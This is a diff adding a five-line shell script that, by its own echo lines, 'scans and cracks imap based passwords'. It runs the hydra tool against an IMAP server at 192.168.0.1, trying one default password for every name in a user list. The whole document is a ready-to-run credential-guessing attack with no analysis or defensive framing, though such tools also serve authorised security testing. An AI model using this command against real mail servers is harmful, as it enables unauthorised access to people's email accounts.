@@ -1,0 +1,5 @@
+echo You Must Configure Username and Password files;
+echo This script scans and cracks imap based passwords;
+ 
+hydra -L user.txt -p defaultpw -S 192.168.0.1 imap PLAIN
+
